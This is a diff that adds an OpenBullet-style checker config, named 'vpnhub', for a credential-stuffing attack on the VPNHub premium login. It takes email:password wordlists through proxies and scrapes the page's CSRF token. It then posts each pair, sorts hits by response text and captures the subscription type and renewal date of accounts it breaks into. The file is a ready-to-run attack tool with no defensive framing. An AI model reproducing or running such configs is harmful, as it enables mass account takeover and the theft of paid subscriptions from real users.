@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "vpnhub",
+  "SuggestedBots": 100,
+  "LastModified": "2019-08-08T17:48:24.800706+03:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "sqart",
+  "Version": "1.2.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "EmailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get REQUEST GET "https://www.vpnhub.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "name=\"_token\" value=\"" "\" /></" -> VAR "token" 
+#post REQUEST POST "https://www.vpnhub.com/premium/login" 
+  CONTENT "_username=<USER>&_password=<PASS>&_token=<token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials." 
+  KEYCHAIN Success OR 
+    KEY "ACCOUNT DETAILS" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<ADDRESS>" Contains "new" 
+    KEY "<ADDRESS>" Contains "expired" 
+#current_sub. PARSE "<SOURCE>" LR "class=\"subtitle\">Current Subscription: <span>" "</span></p>" -> CAP "Current Subscription" 
+#Renewal_date PARSE "<SOURCE>" LR "class=\"subtitle\">Auto-Renewal date: <span>" "</span></p>" -> CAP "Renewal date" 
